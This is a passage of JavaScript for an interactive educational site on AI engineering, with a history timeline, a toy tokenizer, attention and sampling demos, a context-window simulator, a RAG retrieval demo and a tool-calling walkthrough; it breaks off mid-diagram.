/* The AI Engineering Atlas: navigation, content data and 2D interactives. 3D lives in scenes.js. */
const $ = (s, r = document) => r.querySelector(s);
const $$ = (s, r = document) => [...r.querySelectorAll(s)];
const esc = s => String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
const css = n => getComputedStyle(document.documentElement).getPropertyValue(n).trim();
const reduced = matchMedia('(prefers-reduced-motion: reduce)').matches;
const store = {
  get(k, d) { try { const v = localStorage.getItem(k); return v == null ? d : JSON.parse(v); } catch { return d; } },
  set(k, v) { try { localStorage.setItem(k, JSON.stringify(v)); } catch {} },
};
// Events shared with scenes.js; the last value is kept so scenes that load later can catch up.
window.lastEvt = {};
const emit = (n, d) => { lastEvt[n] = d; document.dispatchEvent(new CustomEvent(n, { detail: d })); };
const on = (n, f) => document.addEventListener(n, e => f(e.detail));
const themeFns = [];
window.onTheme = fn => themeFns.push(fn);
const fireTheme = () => requestAnimationFrame(() => themeFns.forEach(f => f()));
new MutationObserver(fireTheme).observe(document.documentElement, { attributes: true, attributeFilter: ['data-theme'] });
matchMedia('(prefers-color-scheme: light)').addEventListener('change', fireTheme);
const onResize = fn => { let t; addEventListener('resize', () => { clearTimeout(t); t = setTimeout(fn, 120); }); };
function hidpi(cv) {
  const r = cv.getBoundingClientRect(), d = Math.min(devicePixelRatio || 1, 2);
  cv.width = Math.max(1, r.width * d); cv.height = Math.max(1, r.height * d);
  const g = cv.getContext('2d'); g.setTransform(d, 0, 0, d, 0, 0);
  return { g, w: r.width, h: r.height };
}
function seg(el, items, i0, fn) {
  el.innerHTML = items.map((t, i) => `<button type="button" data-i="${i}" role="tab">${t}</button>`).join('');
  const pick = i => { $$('button', el).forEach((b, j) => { b.classList.toggle('on', i === j); b.setAttribute('aria-selected', i === j); }); fn(i); };
  el.onclick = e => { const b = e.target.closest('button'); if (b) pick(+b.dataset.i); };
  pick(i0);
}

/* ---------- flow diagrams (RAG, memory, patterns, n8n, OpenClaw) ---------- */
let uid = 0;
function flowSVG(spec) {
  const u = ++uid, N = {};
  spec.nodes.forEach(n => {
    const w = n.w || Math.max(112, n.label.length * 8 + 30, (n.sub || '').length * 6.2 + 26);
    N[n.id] = { h: n.sub ? 54 : 42, ...n, w };
  });
  let paths = '', dots = '', boxes = '';
  spec.edges.forEach(([a, b, o = {}], i) => {
    const A = N[a], B = N[b], id = `fp${u}_${i}`, dx = B.x - A.x, dy = B.y - A.y;
    let d;
    if (o.below) {
      const y1 = A.y + A.h / 2, y2 = B.y + B.h / 2;
      d = `M${A.x},${y1} C${A.x},${y1 + o.below} ${B.x},${y2 + o.below} ${B.x},${y2}`;
    } else if (Math.abs(dx) >= Math.abs(dy) * 0.9) {
      const s = Math.sign(dx) || 1, sx = A.x + s * A.w / 2, ex = B.x - s * B.w / 2, mx = (sx + ex) / 2;
      d = `M${sx},${A.y} C${mx},${A.y} ${mx},${B.y} ${ex},${B.y}`;
    } else {
      const s = Math.sign(dy) || 1, sy = A.y + s * A.h / 2, ey = B.y - s * B.h / 2, my = (sy + ey) / 2;
      d = `M${A.x},${sy} C${A.x},${my} ${B.x},${my} ${B.x},${ey}`;
    }
    paths += `<path id="${id}" d="${d}" class="s-fg3" fill="none" stroke-width="1.2" ${o.dash ? 'stroke-dasharray="4 5"' : ''} marker-end="url(#m${u})"/>`;
    if (!reduced && !o.nodot) dots += `<circle r="3.2" class="f-${o.k || A.k}"><animateMotion dur="${o.dur || 2.6}s" repeatCount="indefinite" begin="${((i * .43) % 2.2).toFixed(2)}s"><mpath href="#${id}"/></animateMotion></circle>`;
  });
  Object.values(N).forEach(n => {
    const x = n.x - n.w / 2, y = n.y - n.h / 2;
    boxes += `<g ${n.click ? `data-id="${n.id}" style="cursor:pointer" tabindex="0" role="button" aria-label="${esc(n.label)}"` : ''}>
      <rect x="${x}" y="${y}" width="${n.w}" height="${n.h}" rx="10" class="f-bg s-${n.k}" stroke-width="${n.strong ? 1.8 : 1}" stroke-opacity="${n.strong ? 1 : .75}"/>
      <text x="${n.x}" y="${n.sub ? n.y - 5 : n.y + 5}" text-anchor="middle" class="f-fg" font-size="13.5" font-weight="500">${esc(n.label)}</text>
      ${n.sub ? `<text x="${n.x}" y="${n.y + 14}" text-anchor="middle" class="f-fg3" font-size="11">${esc(n.sub)}</text>` : ''}</g>`;
  });
  return `<svg viewBox="0 0 ${spec.w} ${spec.h}" role="img" aria-label="${esc(spec.label || 'diagram')}">
    <defs><marker id="m${u}" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,1 L9,5 L0,9" fill="none" class="s-fg3" stroke-width="1.5"/></marker></defs>
    ${spec.extra || ''}${paths}${dots}${boxes}</svg>`;
}
function clickable(el, fn) {
  el.addEventListener('click', e => { const g = e.target.closest('[data-id]'); if (g) fn(g.dataset.id); });
  el.addEventListener('keydown', e => { const g = e.target.closest('[data-id]'); if (g && (e.key === 'Enter' || e.key === ' ')) { e.preventDefault(); fn(g.dataset.id); } });
}

/* ---------- navigation ---------- */
(function nav() {
  const nav = $('#nav'), secs = $$('section.chapter');
  let part = '';
  nav.innerHTML = secs.map(s => {
    const head = s.dataset.part !== part ? `<div class="pt">${esc(s.dataset.part)}</div>` : '';
    part = s.dataset.part;
    return head + `<a href="#${s.id}"><b>${s.id.slice(2)}</b>${esc(s.dataset.nav)}</a>`;
  }).join('');
  $$('section.part').forEach(p => {
    $('.part-toc', p).innerHTML = secs.filter(s => s.dataset.part === p.dataset.part).map(s => `<a href="#${s.id}"><b>${s.id.slice(2)}</b>${esc(s.dataset.nav)}</a>`).join('');
  });
  const links = $$('a', nav);
  const io = new IntersectionObserver(es => es.forEach(e => {
    if (e.isIntersecting) links.forEach(a => a.classList.toggle('on', a.hash === '#' + e.target.id));
  }), { rootMargin: '-35% 0px -60% 0px' });
  secs.forEach(s => io.observe(s));
  const bar = $('#readBar');
  addEventListener('scroll', () => {
    const h = document.documentElement;
    bar.style.width = (h.scrollTop / Math.max(1, h.scrollHeight - h.clientHeight) * 100).toFixed(1) + '%';
  }, { passive: true });
  const rail = $('#rail'), scrim = $('#scrim'), btn = $('#menuBtn');
  const setOpen = o => { rail.classList.toggle('open', o); scrim.classList.toggle('open', o); btn.setAttribute('aria-expanded', o); };
  btn.onclick = () => setOpen(!rail.classList.contains('open'));
  scrim.onclick = () => setOpen(false);
  rail.addEventListener('click', e => { if (e.target.closest('a')) setOpen(false); });
  addEventListener('keydown', e => { if (e.key === 'Escape') setOpen(false); });
  $('#themeBtn').onclick = () => {
    const r = document.documentElement;
    const cur = r.dataset.theme || (matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark');
    r.dataset.theme = cur === 'light' ? 'dark' : 'light';
  };
})();

/* ---------- 01 timeline ---------- */
(function timeline() {
  const eras = [
    { id: 'early', name: 'Early ideas', c: '--fg3' }, { id: 'deep', name: 'Deep learning', c: '--mem' },
    { id: 'tf', name: 'Transformers', c: '--ctx' }, { id: 'chat', name: 'Chat era', c: '--model' }, { id: 'agent', name: 'Agent era', c: '--tool' },
  ];
  const ev = [
    ['early', '1950', 'Can machines think?', 'Alan Turing proposes the imitation game, later called the Turing test.'],
    ['early', '1956', 'AI gets its name', 'The Dartmouth workshop coins "artificial intelligence" and expects to crack it in a summer.'],
    ['early', '1958', 'The Perceptron', 'Frank Rosenblatt builds a single artificial neuron that learns from examples. The ancestor of every model here.'],
    ['early', '1966', 'ELIZA', 'A pattern-matching chatbot. People confided in it anyway: an early lesson in how much we trust fluent text.'],
    ['early', '1970s–80s', 'AI winters', 'Promises outran computers. Funding froze twice. Hand-written "expert systems" had a brief boom.'],
    ['early', '1986', 'Backpropagation', 'Rumelhart, Hinton and Williams popularise the method for training multi-layer networks. Still used today.'],
    ['early', '1997', 'Deep Blue & LSTM', 'IBM beats Kasparov at chess with brute-force search. LSTMs give networks memory for sequences.'],
    ['deep', '2012', 'AlexNet', 'A GPU-trained neural net wins the ImageNet contest by a wide margin. The deep learning era begins.'],
    ['deep', '2013', 'word2vec', 'Words become vectors, and "king − man + woman ≈ queen" shows meaning can be geometry.'],
    ['deep', '2014', 'Attention & GANs', 'Attention appears in translation models. GANs start generating realistic images.'],
    ['deep', '2016', 'AlphaGo', 'DeepMind beats Lee Sedol at Go, a feat experts thought was a decade away.'],
    ['tf', '2017', 'The Transformer', '"Attention Is All You Need" (Google). The architecture behind every LLM since.'],
    ['tf', '2018', 'GPT-1 & BERT', 'Pre-train on lots of text, then adapt to tasks. The recipe is set.'],
    ['tf', '2019', 'GPT-2', '1.5 billion parameters. OpenAI initially held back the full model over misuse fears.'],
    ['tf', '2020', 'GPT-3 & scaling laws', '175B parameters. Learns tasks from examples in the prompt. Loss falls predictably with scale.'],
    ['tf', '2021', 'Codex & Copilot', 'Models write code inside the editor. The first mass-market AI developer tool.'],
    ['chat', '2022', 'Chain of thought & RLHF', '"Think step by step" boosts reasoning. Human feedback makes models follow instructions.'],
    ['chat', 'Nov 2022', 'ChatGPT', 'A chat interface on a tuned model becomes the fastest-growing consumer app of its time.'],
    ['chat', '2023', 'GPT-4, Claude, Llama', 'Frontier models, open weights, the first agent hype with AutoGPT, and function-calling APIs.'],
    ['agent', '2024', 'Reasoning & computer use', 'OpenAI o1 thinks before answering. Claude learns to operate a computer screen.'],
    ['agent', 'Nov 2024', 'MCP', 'Anthropic open-sources the Model Context Protocol. Within a year it is the standard for tools.'],
    ['agent', 'Early 2025', 'Open reasoning & coding agents', 'DeepSeek-R1 matches the frontier cheaply. Claude Code brings agents to the terminal. "Vibe coding" is coined.'],
    ['agent', 'Mid 2025', 'Agents everywhere', 'Claude 4, Gemini 2.5, GPT-5, the A2A protocol. "Context engineering" becomes the skill to have.'],
    ['agent', 'Late 2025', 'Skills & open standards', 'Agent Skills launch. MCP and AGENTS.md move to the Linux Foundation\'s Agentic AI Foundation.'],
    ['agent', '2026', 'Long-running agents', 'OpenClaw makes personal agents mainstream. Agents work for hours in the background, and companies reorganise around them.'],
  ];
  const E = Object.fromEntries(eras.map(e => [e.id, e]));
  const track = $('#timeline');
  track.innerHTML = ev.map(([era, yr, t, d]) => `<article class="tl-card" data-era="${era}" style="--era:var(${E[era].c})"><span class="era">${E[era].name}</span><span class="yr">${yr}</span><h4>${esc(t)}</h4><p>${esc(d)}</p></article>`).join('');
  let first = true;
  seg($('#eraFilter'), eras.map(e => e.name), 0, i => {
    if (first) { first = false; return; }
    const card = track.querySelector(`[data-era="${eras[i].id}"]`);
    track.scrollTo({ left: card.offsetLeft - track.offsetLeft, behavior: reduced ? 'auto' : 'smooth' });
  });
})();

/* ---------- 03 tokenizer ---------- */
(function tokenizer() {
  const SUF = ['ization', 'ation', 'ment', 'ness', 'able', 'ible', 'ing', 'est', 'ed', 'ly'];
  const PRE = ['un', 're', 'pre', 'dis'];
  function splitWord(w) {
    if (w.length <= 6) return [w];
    const out = [];
    const pre = PRE.find(p => w.toLowerCase().startsWith(p) && w.length - p.length > 5);
    if (pre) { out.push(w.slice(0, pre.length)); w = w.slice(pre.length); }
    const suf = SUF.find(s => w.toLowerCase().endsWith(s) && w.length - s.length >= 3);
    let tail = '';
    if (suf) { tail = w.slice(-suf.length); w = w.slice(0, -suf.length); }
    for (let i = 0; i < w.length; i += 5) out.push(w.slice(i, i + 5));
    if (tail) out.push(tail);
    return out;
  }
  function tokenize(text) {
    const parts = text.match(/ ?[A-Za-z]+| ?\d{1,3}| ?[^\sA-Za-z\d]{1,2}|\s+/g) || [];
    const out = [];
    for (const p of parts) {
      const sp = p.startsWith(' ') && p.trim() ? ' ' : '';
      const core = sp ? p.slice(1) : p;
      if (/^[A-Za-z]+$/.test(core)) splitWord(core).forEach((c, i) => out.push((i === 0 ? sp : '') + c));
      else out.push(p);
    }
    return out;
  }
  const hash = s => { let h = 7; for (const c of s) h = (h * 31 + c.charCodeAt(0)) % 99991; return h; };
  const cols = ['--ctx', '--model', '--tool', '--mem', '--risk'];
  const inp = $('#tokIn'), out = $('#tokOut');
  const run = () => {
    const toks = tokenize(inp.value);
    out.innerHTML = toks.map((t, i) => `<span title="token id ${hash(t)}" style="--c:var(${cols[i % 5]})">${esc(t)}</span>`).join('');
    const ch = inp.value.length;
    $('#tokStats').textContent = `${toks.length} tokens · ${ch} chars · ${(ch / Math.max(1, toks.length)).toFixed(1)} per token`;
  };
  inp.addEventListener('input', run); run();
})();

/* ---------- 04 attention ---------- */
(function attention() {
  const words = ['The', 'animal', "didn't", 'cross', 'the', 'street', 'because', 'it', 'was', 'too', 'tired'];
  let mode = 'tired', sel = 7;
  const box = $('#att'), wrap = $('#attWords'), svg = $('#attSvg');
  function weights(i) {
    const S = {
      tired: { 7: { 1: .58, 5: .07, 7: .1, 10: .12, 0: .04, 6: .04, 8: .05 }, 10: { 1: .4, 7: .3, 9: .15, 10: .15 } },
      wide: { 7: { 5: .55, 1: .08, 7: .1, 10: .14, 4: .05, 6: .04, 8: .04 }, 10: { 5: .4, 7: .3, 9: .15, 10: .15 } },
    }[mode];
    if (S[i]) return S[i];
    if (i === 1) return { 0: .3, 1: .4, 2: .15, 3: .15 };
    if (i === 5) return { 4: .3, 5: .4, 3: .3 };
    const w = { [i]: .4 };
    if (i > 0) w[i - 1] = .3;
    if (i < words.length - 1) w[i + 1] = .3;
    return w;
  }
  function draw() {
    words[10] = mode;
    wrap.innerHTML = words.map((w, i) => `<button class="${i === sel ? 'sel' : ''}" data-i="${i}">${w}</button>`).join('');
    const br = box.getBoundingClientRect();
    const pos = $$('button', wrap).map(b => { const r = b.getBoundingClientRect(); return { x: r.left - br.left + r.width / 2, y: r.top - br.top - 2 }; });
    const W = weights(sel), a = pos[sel];
    let s = '';
    Object.entries(W).forEach(([j, w]) => {
      j = +j; if (j === sel || w < .04) return;
      const b = pos[j], h = Math.min(150, 26 + Math.abs(b.x - a.x) * .38 + Math.abs(b.y - a.y) * .3), top = Math.min(a.y, b.y) - h;
      s += `<path d="M${a.x},${a.y} C${a.x},${top} ${b.x},${top} ${b.x},${b.y}" fill="none" class="s-model" stroke-width="${(.8 + w * 9).toFixed(1)}" stroke-linecap="round" opacity="${(.3 + w).toFixed(2)}"/>
        <text x="${b.x}" y="${b.y - 7}" text-anchor="middle" font-size="10.5" class="f-model" style="font-family:var(--mono)">${Math.round(w * 100)}%</text>`;
    });
    svg.innerHTML = s;
  }
  wrap.addEventListener('click', e => { const b = e.target.closest('button'); if (b) { sel = +b.dataset.i; draw(); } });
  $$('[data-att]').forEach(b => b.onclick = () => { mode = b.dataset.att; $$('[data-att]').forEach(x => x.classList.toggle('on', x === b)); draw(); });
  draw(); onResize(draw);
  document.fonts && document.fonts.ready.then(draw);
})();

/* ---------- 05 sampler ---------- */
(function sampler() {
  const PROMPT = 'The best way to learn AI engineering is to';
  const S0 = [[' build', 3.2], [' start', 2.5], [' read', 1.9], [' practice', 1.6], [' ask', 1.0], [' teach', .6], [' panic', -.6]];
  const CONT = {
    ' build': [' small', ' projects', ',', ' break', ' them', ',', ' and', ' read', ' the', ' logs', '.'],
    ' start': [' with', ' one', ' real', ' problem', ' you', ' care', ' about', '.'],
    ' read': [' the', ' docs', ',', ' then', ' build', ' something', ' today', '.'],
    ' practice': [' on', ' real', ' tasks', ' every', ' single', ' day', '.'],
    ' ask': [' better', ' questions', ' and', ' test', ' the', ' answers', '.'],
    ' teach': [' what', ' you', ' just', ' learned', '.'],
    ' panic': ['.', ' Then', ' build', ' something', ' anyway', '.'],
  };
  const DECOYS = [' tiny', ' the', ' banana', ' quickly', ' purple', ' seven', ' very', ' my'];
  let first = null, step = 0, toks = [];
  const T = () => +$('#temp').value, P = () => +$('#topp').value;
  function cands() {
    if (step === 0) return S0;
    const nx = CONT[first][step - 1];
    if (nx === undefined) return null;
    const d = i => DECOYS[(step * 3 + i) % DECOYS.length];
    return [[nx, 4], [d(0), 1.5], [d(1), .8], [d(2), .2]];
  }
  function dist(c) {
    const t = T(), m = Math.max(...c.map(x => x[1]));
    const e = c.map(x => Math.exp((x[1] - m) / t)), z = e.reduce((a, b) => a + b, 0), p = e.map(v => v / z);
    const order = p.map((v, i) => i).sort((a, b) => p[b] - p[a]);
    const kept = new Set(); let cum = 0;
    for (const i of order) { kept.add(i); cum += p[i]; if (cum >= P()) break; }
    const kz = [...kept].reduce((a, i) => a + p[i], 0);
    return c.map((x, i) => ({ t: x[0], p: kept.has(i) ? p[i] / kz : 0, kept: kept.has(i) }));
  }
  const sample = d => { let r = Math.random(), acc = 0; for (const x of d) { acc += x.p; if (r <= acc) return x; } return d.find(x => x.kept); };
  const show = t => t.startsWith(' ') ? '␣' + t.slice(1) : t;
  function render() {
    $('#tempOut').textContent = T().toFixed(2); $('#toppOut').textContent = P().toFixed(2);
    $('#genLine').innerHTML = esc(PROMPT) + toks.map((t, i) => `<span class="${i === toks.length - 1 ? 'new' : ''}">${esc(t)}</span>`).join('');
    const c = cands();
    $('#genStep').disabled = $('#genRoll').disabled = !c;
    if (!c) { $('#probs').innerHTML = '<p class="note">End of sentence: the model produced a stop signal. Reset to try another temperature.</p>'; return; }
    $('#probs').innerHTML = dist(c).map(x => `<div class="prob ${x.kept ? '' : 'cut'}"><span>${esc(show(x.t))}</span><div class="bar"><span style="width:${(x.p * 100).toFixed(1)}%"></span></div><span>${(x.p * 100).toFixed(1)}%</span></div>`).join('');
  }
  $('#genStep').onclick = () => { const c = cands(); if (!c) return; const x = sample(dist(c)); toks.push(x.t); if (step === 0) first = x.t; step++; $('#hist').innerHTML = ''; render(); };
  $('#genRoll').onclick = () => {
    const c = cands(); if (!c) return;
    const d = dist(c), n = {};
    for (let i = 0; i < 100; i++) { const x = sample(d); n[x.t] = (n[x.t] || 0) + 1; }
    const mx = Math.max(...Object.values(n));
    $('#hist').innerHTML = d.map(x => `<div style="height:${((n[x.t] || 0) / mx * 100).toFixed(0)}%"><span>${esc(show(x.t))} ${n[x.t] || 0}</span></div>`).join('');
  };
  $('#genReset').onclick = () => { first = null; step = 0; toks = []; $('#hist').innerHTML = ''; render(); };
  $('#temp').oninput = $('#topp').oninput = render;
  render();
})();

/* ---------- 06 training stages ---------- */
(function stages() {
  const S = [
    { n: 'Pre-training', in: 'Trillions of tokens: web pages, books, code, papers.', how: 'Predict the next token, over and over, for weeks to months on huge GPU clusters.', out: 'A base model: a brilliant autocomplete that continues any text, but doesn\'t know it should answer you.',
      a: 'What is the capital of Brazil?\nWhat is the capital of Canada?\nWhat is the capital of Kenya?\n…\n\n(It continues the pattern of a quiz page. It is completing a document, not answering.)' },
    { n: 'Instruction tuning', in: 'Tens of thousands of example conversations written by people: prompt, then ideal answer.', how: 'Supervised fine-tuning (SFT): keep training, but only on these examples.', out: 'An assistant that takes turns and answers directly.', a: 'The capital of Australia is Canberra.' },
    { n: 'Preference tuning', in: 'Pairs of answers ranked by people (RLHF) or by an AI following written principles (RLAIF, Constitutional AI).', how: 'Reinforcement learning nudges the model toward answers that are helpful, honest and harmless.', out: 'A model that anticipates what you need, adds context, admits uncertainty and declines harmful requests.',
      a: 'The capital of Australia is Canberra.\n\nMany people guess Sydney, the largest city, but Canberra was purpose-built as a compromise between Sydney and Melbourne.' },
    { n: 'Reasoning RL', in: 'Problems with checkable answers: maths, code with tests, puzzles, multi-step agent tasks.', how: 'The model tries many chains of thought; attempts that reach verified answers are reinforced.', out: 'A model that thinks before answering, checks its work, and stays on track across long tasks.',
      a: '[thinking]\nLargest city is Sydney, but that isn\'t the capital.\nThe site was chosen in 1908 as a compromise between\nSydney and Melbourne: Canberra. Parliament moved\nthere in 1927. Confident.\n[/thinking]\n\nCanberra.' },
  ];
  seg($('#stageTabs'), S.map((s, i) => `${i + 1} · ${s.n}`), 0, i => {
    const s = S[i];
    $('#stageInfo').innerHTML = `<span class="kicker" style="color:var(--model)">Stage ${i + 1} · ${s.n}</span><p><strong>What goes in.</strong> ${s.in}</p><p><strong>How.</strong> ${s.how}</p><p><strong>What comes out.</strong> ${s.out}</p>`;
    $('#stageAnswer').textContent = s.a;
  });
})();

/* ---------- 07 scaling chart ---------- */
(function scaling() {
  const cv = $('#scaleChart');
  function draw() {
    const { g, w, h } = hidpi(cv), p = { l: 52, r: 18, t: 18, b: 42 }, W = w - p.l - p.r, H = h - p.t - p.b;
    const X = e => p.l + (e - 20) / 6 * W, L = e => 1.69 + 2.2 * Math.pow(10, -(e - 20) * .15), Y = v => p.t + (1 - (v - 1.5) / 2.6) * H;
    g.clearRect(0, 0, w, h);
    g.font = '10.5px ' + css('--mono'); g.fillStyle = css('--fg3'); g.strokeStyle = css('--line'); g.lineWidth = 1;
    for (let e = 20; e <= 26; e++) { g.beginPath(); g.moveTo(X(e), p.t); g.lineTo(X(e), p.t + H); g.stroke(); g.textAlign = 'center'; g.fillText('10^' + e, X(e), h - 22); }
    [2, 2.5, 3, 3.5, 4].forEach(v => { g.beginPath(); g.moveTo(p.l, Y(v)); g.lineTo(p.l + W, Y(v)); g.stroke(); g.textAlign = 'right'; g.fillText(v.toFixed(1), p.l - 10, Y(v) + 4); });
    g.textAlign = 'center'; g.fillText('TRAINING COMPUTE (FLOPS, LOG SCALE)', p.l + W / 2, h - 6);
    g.save(); g.translate(14, p.t + H / 2); g.rotate(-Math.PI / 2); g.fillText('LOSS', 0, 0); g.restore();
    const grad = g.createLinearGradient(p.l, 0, p.l + W, 0); grad.addColorStop(0, css('--ctx')); grad.addColorStop(1, css('--model'));
    g.beginPath(); for (let e = 20; e <= 26.001; e += .05) e === 20 ? g.moveTo(X(e), Y(L(e))) : g.lineTo(X(e), Y(L(e)));
    g.strokeStyle = grad; g.lineWidth = 2; g.stroke();
    [20.6, 21.7, 22.9, 24.1, 25.3].forEach(e => { g.beginPath(); g.arc(X(e), Y(L(e)), 4.5, 0, 7); g.fillStyle = css('--bg'); g.fill(); g.strokeStyle = css('--fg'); g.lineWidth = 1.5; g.stroke(); });
    g.fillStyle = css('--fg3'); g.textAlign = 'left'; g.fillText('each point: a larger training run', X(22.9) + 12, Y(L(22.9)) - 10);
  }
  draw(); onResize(draw); onTheme(draw);
})();

/* ---------- 10 context window (3D blocks in scenes.js) ---------- */
(function ctxWindow() {
  const LIMIT = 200000;
  const K = { sys: ['System prompt', '--human'], tooldef: ['Tool definitions', '--tool'], chat: ['Conversation', '--ctx'], docs: ['Retrieved docs', '--mem'], out: ['Tool output', '--model'], sum: ['Summary', '--fg3'] };
  let items;
  const reset = () => { items = [['sys', 4000], ['tooldef', 12000]]; };
  reset();
  $('#cwLegend').innerHTML = Object.values(K).map(([n, c]) => `<span><i class="dotk" style="--c:var(${c})"></i>${n}</span>`).join('');
  const fmt = n => n >= 1000 ? Math.round(n / 1000) + 'K' : n;
  function render() {
    const total = items.reduce((a, x) => a + x[1], 0), f = total / LIMIT;
    emit('ctx:update', { limit: LIMIT, items: items.map(([k, n]) => ({ c: K[k][1], n })) });
    $('#cwStat').textContent = `${fmt(total)} / 200K tokens`;
    const q = f > 1 ? 25 : Math.round(100 - Math.max(0, f - .25) * 55), qb = $('#cwQ');
    qb.style.width = q + '%'; qb.style.background = `var(${q > 80 ? '--tool' : q > 55 ? '--model' : '--risk'})`;
    $('#cwNote').textContent = f > 1 ? 'Over the limit. The call fails, or the harness drops the oldest content, which can silently remove the instructions that mattered. Compact now.'
      : f > .75 ? 'Getting full. Quality drifts as windows fill, each call is slower, and every token is paid for again on every turn.'
      : f > .3 ? 'Healthy but growing. Tool outputs and documents dwarf the conversation itself.'
      : 'A fresh window. Instructions and tool definitions take room before you type anything.';
  }
  const add = { turn: ['chat', 2500], file: ['out', 28000], rag: ['docs', 15000], tool: ['out', 8000] };
  $$('[data-cw]').forEach(b => b.onclick = () => {
    const a = b.dataset.cw;
    if (a === 'reset') reset();
    else if (a === 'compact') {
      const keep = items.filter(x => x[0] === 'sys' || x[0] === 'tooldef');
      const rest = items.filter(x => x[0] !== 'sys' && x[0] !== 'tooldef').reduce((s, x) => s + x[1], 0);
      items = rest ? [...keep, ['sum', Math.max(1500, Math.round(rest * .06))]] : keep;
    } else items.push(add[a]);
    render();
  });
  render();
})();

/* ---------- 11 RAG ---------- */
(function rag() {
  $('#ragFlow').innerHTML = flowSVG({
    w: 900, h: 260, label: 'RAG pipeline',
    extra: `<text x="14" y="22" class="f-fg3" font-size="10" style="font-family:var(--mono);letter-spacing:.14em">INDEXING · ONCE</text><text x="14" y="152" class="f-fg3" font-size="10" style="font-family:var(--mono);letter-spacing:.14em">QUERY · EVERY QUESTION</text>`,
    nodes: [
      { id: 'docs', x: 90, y: 70, label: 'Your documents', sub: 'wiki, PDFs, tickets', k: 'human' },
      { id: 'chunk', x: 275, y: 70, label: 'Chunk + embed', sub: 'split, then text → vectors', k: 'mem' },
      { id: 'vdb', x: 460, y: 70, label: 'Vector index', sub: 'vectors + original text', k: 'mem' },
      { id: 'q', x: 90, y: 205, label: 'Question', sub: '"How many vacation days?"', k: 'human' },
      { id: 'qe', x: 275, y: 205, label: 'Embed question', sub: 'same embedding model', k: 'mem' },
      { id: 'search', x: 460, y: 205, label: 'Search', sub: 'nearest + keywords', k: 'ctx' },
      { id: 'prompt', x: 640, y: 205, label: 'Augment prompt', sub: 'question + best chunks', k: 'ctx' },
      { id: 'llm', x: 815, y: 205, label: 'Model', sub: 'answer with citations', k: 'model', w: 150 },
    ],
    edges: [['docs', 'chunk'], ['chunk', 'vdb'], ['vdb', 'search'], ['q', 'qe'], ['qe', 'search'], ['search', 'prompt'], ['prompt', 'llm']],
  });
  const chunks = [
    'Vacation: full-time employees get 24 paid vacation days per year, accrued monthly.',
    'Vacation requests must be submitted in the HR portal at least two weeks in advance.',
    'Expenses: meals while travelling are reimbursed up to $60 per day with receipts.',
    'Remote work: employees may work remotely up to three days per week with manager approval.',
    'Laptops are replaced every three years. Request a new one through the IT portal.',
    'Parental leave: 20 weeks paid for primary caregivers, 8 weeks for secondary caregivers.',
    'Security: never share passwords. Report phishing emails to security@company.example.',
    'Expenses must be submitted within 30 days of purchase in the finance portal.',
  ];
  const Q = [
    ['Vacation days?', 'How many vacation days do I get?', 'You get 24 paid vacation days a year, accrued monthly [1]. Book them in the HR portal at least two weeks ahead [2].'],
    ['Work from home?', 'Can I work from home on Fridays?', 'Yes, with your manager\'s approval. You can work remotely up to three days per week [4].'],
    ['Meal limit?', "What's the meal limit when I travel?", 'Meals while travelling are reimbursed up to $60 per day with receipts [3]. Submit within 30 days [8].'],
    ['Phishing?', 'How do I report a phishing email?', 'Report it to security@company.example [7].'],
  ];
  const STOP = new Set('a an the i do get can what how is to of in on my me per with at be for up are may and or when while must through every one new'.split(' '));
  const SYN = { home: 'remote', remotely: 'remote', fridays: 'week', friday: 'week', travelling: 'travel', meals: 'meal', limit: 'reimbursed', days: 'day', emails: 'email' };
  const words = s => s.toLowerCase().replace(/[^a-z0-9 ]/g, ' ').split(/\s+/).filter(w => w && !STOP.has(w)).map(w => SYN[w] || w.replace(/s$/, ''));
  seg($('#ragQs'), Q.map(q => q[0]), 0, i => {
    const qw = new Set(words(Q[i][1]));
    const sc = chunks.map((c, j) => { const cw = words(c); return { j, s: cw.filter(w => qw.has(w)).length / Math.sqrt(cw.length) }; });
    const mx = Math.max(...sc.map(x => x.s)) || 1, sorted = [...sc].sort((a, b) => b.s - a.s), top = sorted.slice(0, 3).filter(x => x.s > 0), topSet = new Set(top.map(x => x.j));
    emit('rag:query', { i, top: top.map(x => x.j) });
    $('#ragScores').innerHTML = sorted.map(x => `<div class="prob ${topSet.has(x.j) ? '' : 'cut'}" style="grid-template-columns:34px 1fr 40px" title="${esc(chunks[x.j])}"><span>[${x.j + 1}]</span><div class="bar"><span style="width:${(x.s / mx * 100).toFixed(0)}%;background:var(--mem)"></span></div><span>${x.s.toFixed(2)}</span></div>`).join('');
    const ctx = [...top].sort((a, b) => a.j - b.j).map(x => `[${x.j + 1}] ${chunks[x.j]}`).join('\n');
    $('#ragPrompt').innerHTML = `<span class="c">SYSTEM</span> Answer only from the context. Cite chunk numbers. If the answer isn't there, say so.\n\n<span class="c">CONTEXT</span>\n<span class="k">${esc(ctx)}</span>\n\n<span class="c">QUESTION</span> ${esc(Q[i][1])}\n\n<span class="c">→ MODEL</span> <span class="n">${esc(Q[i][2])}</span>`;
  });
})();

/* ---------- 12 tool calling sequence ---------- */
(function sequence() {
  const lanes = [['User', 'human', 90], ['Your app (harness)', 'ctx', 300], ['Model', 'model', 510], ['Weather API', 'tool', 720]];
  const steps = [
    [0, 1, 'Should I take an umbrella in Pune today?', 'User types: "Should I take an umbrella in Pune today?"'],
    [1, 2, 'messages + tool definitions', `client.messages.create(
    model="claude-opus-5-5",
    max_tokens=16000,
    tools=[{"name": "get_weather", "input_schema": {...}}],
    messages=[{"role": "user",
               "content": "Should I take an umbrella in Pune today?"}],
)`],
    [2, 1, 'tool_use: get_weather(city: "Pune")', `{
  "stop_reason": "tool_use",
  "content": [
    { "type": "text", "text": "Let me check the forecast." },
    { "type": "tool_use", "id": "toolu_01",
      "name": "get_weather", "input": { "city": "Pune" } }
  ]
}`],
    [1, 3, 'GET /weather?city=Pune', `# Your code runs this. The model never touches the API.
result = weather_api.get(city="Pune")`],
    [3, 1, '{ rain_chance: 0.8, temp_c: 27 }', `{ "city": "Pune", "rain_chance": 0.8, "temp_c": 27 }`],
    [1, 2, 'tool_result, appended to messages', `messages.append({"role": "assistant", "content": reply.content})
messages.append({"role": "user", "content": [
    {"type": "tool_result", "tool_use_id": "toolu_01",
     "content": '{"rain_chance": 0.8, "temp_c": 27}'}]})
# ...then call the model again with the full history`],
    [2, 1, '"Yes, take one. 80% chance of rain."', `{
  "stop_reason": "end_turn",
